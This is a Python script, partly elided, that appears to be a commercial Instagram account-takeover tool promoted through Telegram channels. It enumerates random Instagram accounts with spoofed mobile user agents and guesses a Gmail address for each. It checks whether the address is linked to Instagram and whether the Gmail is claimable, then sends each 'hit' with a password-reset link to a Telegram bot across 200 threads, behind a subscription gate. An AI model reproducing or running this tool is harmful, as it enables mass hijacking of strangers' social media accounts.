print("HIGH FOLLOWERS !! ANY ERROR DM THE DEV TO SOLVE")
import os,requests
import webbrowser as w
w.open("https://t.me/+wQzNu8apPow3ZTc1")
...
PST = "https://pastebin.com/raw/LM6DX1x2"
...
RADHEY=render('{INSTA}',colors=['white','magenta'],align='center')
print(RADHEY)
token=input(f"𝗧𝗢𝗞𝗘𝗡 : ")
print('\x1b[1;39m~'*60)
ID=input(' 𝗜𝗗: ')
try:
    requests.post(f"""https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=https://t.me/radhasay/75&caption= [#𝗥𝗔𝗗𝗛𝗘𝗬](https://t.me/+wQzNu8apPow3ZTc1)""")
except Exception:
    pass

EXPIRE_TIME = '2085-05-8 13:00:00'
EXPIRE_MSG = '\x1b[1;33m FILE \033[91m \x1b[38;5;204m HAS  BEEN \033[96m EXPIRED \033[95m DM @X8R1X FOR RENEW'
...
ALLOWED_USER_ID = 5653982765  # yahan apna Telegram user ID daalo

def check_user(user_id):
    if user_id != ALLOWED_USER_ID:
        print(" BUY SUBSCRIPTION FROM BOLORADHEY ")
...
# Example usage
if __name__ == "__main__":
    user_input_id = int(input(" ENTER APPROVED CHAT ID : "))
...
def radheyiginfo(username,jj):
	...
	try:
		...
		if is_business or followers>900:send_to_radhey_only=True;header='#BUSINESS'
		else:send_to_radhey_only=False;header='#𝐑𝐀𝐃𝐇𝐄 𝐆𝐎𝐓 𝐇𝐈𝐓  ';hit_count+=1
		hit_data=f"""
{header}
⚡━━━━━━━━━━━━━━━━━⚡
📌 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗟𝗶𝗻𝗸: https://www.instagram.com/{username}  
...
🔄 𝗥𝗲𝘀𝗲𝘁 𝗟𝗶𝗻𝗸: » {rest(username)}  

⚡━━━━━━━━━━━━━━━━y⚡  
💻 𝗣𝗿𝗼𝗴𝗿𝗮𝗺: @boloradhey | @sunradhey      
"""
		try:
			with open('rdh.txt','a',encoding='utf-8')as file:file.write(hit_data+'\n\n')
		except:pass
		inline_keyboard=[[{'text':'𝐒𝐄𝐍𝐃 𝐒𝐒','url':'http://t.me/sunradheybot'},{'text':'𝐂𝐇𝐀𝐍𝐍𝐄𝐋','url':'https://t.me/+wQzNu8apPow3ZTc1'}]];data={'text':hit_data,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})};data['chat_id']=ID;requests.get(f"https://api.telegram.org/bot{token}/sendMessage",params=data)
	except:pass
def radhey(email):
	global bad_mail
	try:
		if'good'==check_gmail(email):username,jj=email.split('@');radheyiginfo(username,jj)
		else:bad_mail+=1
	except:''
def radheycheck(email):
	global bad_insta,hit_count,bad_mail
	...
	try:
		...
		if method==1:
			...
			if'email_is_taken'in str(response.text):radhey(email)
			else:bad_insta+=1
		elif method==2:
			...
			if email in response:radhey(email)
			else:bad_insta+=1
		elif method==3:
			...
			if'Another account is using the same email'in response.text:radhey(email)
			else:bad_insta+=1
		elif method==4:
...
def radheymain():
	while True:
		try:
			user_id=str(random.randint(2500000000,21254029834));lsd=''.join(random.choices(string.ascii_letters+string.digits,k=16));data={'lsd':lsd,'variables':json.dumps({'id':user_id,'render_surface':'PROFILE'}),'doc_id':'25618261841150840'};headers={'X-FB-LSD':lsd};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);response_json=response.json();user_data=response_json.get('data',{}).get('user',{});username=user_data.get('username','')
			if username and'_'not in username and len(username)>=6:
				follower_count=int(user_data.get('follower_count',0));media_count=int(user_data.get('media_count',0))
				if follower_count>=10 and media_count>0:email=f"{username}@gmail.com";radheycheck(email);continue
		except Exception:continue
		try:
			user_id=str(random.randint(2500000000,21254029834));rnd=str(random.randint(150,999));user_agent=f"Instagram 311.0.0.32.118 Android ({random.choice(['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0'])}; {random.randint(100,1300)}dpi; {random.randint(200,2000)}x{random.randint(200,2000)}; {random.choice(['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME'])}; SM-T{rnd}; SM-T{rnd}; qcom; en_US; 545986{random.randint(111,999)})";lsd=''.join(random.choices(string.ascii_letters+string.digits,k=32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/instagram/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd};data={'lsd':lsd,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':user_id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);response_json=response.json();user_data=response_json.get('data',{}).get('user',{});username=user_data.get('username','')
			if username and'_'not in username and len(username)>=6:
				follower_count=int(user_data.get('follower_count',0));media_count=int(user_data.get('media_count',0))
				if follower_count>=10 and media_count>0:email=f"{username}@gmail.com";radheycheck(email)
		except Exception:continue
threads=[]
for _ in range(200):t=Thread(target=radheymain);t.start();threads.append(t)
